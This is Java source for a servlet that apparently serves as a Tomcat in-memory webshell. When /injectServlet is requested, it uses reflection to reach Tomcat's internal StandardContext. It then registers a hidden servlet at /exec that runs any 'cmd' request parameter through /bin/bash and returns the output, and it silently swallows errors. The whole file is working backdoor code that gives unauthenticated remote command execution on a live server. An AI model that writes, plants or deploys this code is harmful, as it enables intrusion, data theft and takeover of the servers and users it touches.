package com;

import org.apache.catalina.Wrapper;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;

@WebServlet("/injectServlet")
public class InjectServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            ServletContext servletContext = req.getServletContext();

            java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
            //获取ApplicationContext中的StandardContext
            contextField = applicationContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);

            String servletPath = "/exec";
            String servletName = "execServlet";

            Servlet servlet = new Servlet() {
                @Override
                public void init(ServletConfig servletConfig) {}
                @Override
                public ServletConfig getServletConfig() {
                    return null;
                }
                @Override
                public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
                    String cmd = servletRequest.getParameter("cmd");
                    {
                        InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd}).getInputStream();
                        Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                        String output = s.hasNext() ? s.next() : "";
                        servletResponse.setCharacterEncoding("GBK");
                        PrintWriter out = servletResponse.getWriter();
                        out.println(output);
                        out.flush();
                        out.close();
                    }
                }
                @Override
                public String getServletInfo() {
                    return null;
                }
                @Override
                public void destroy() {
                }
            };

            Wrapper wrapper = standardContext.createWrapper();
            wrapper.setName(servletName);
            wrapper.setServlet(servlet);
            wrapper.setServletClass(servlet.getClass().getName());
            wrapper.setLoadOnStartup(1);
            standardContext.addChild(wrapper);
            standardContext.addServletMappingDecoded(servletPath, servletName);



        } catch (Exception e){}
    }
}
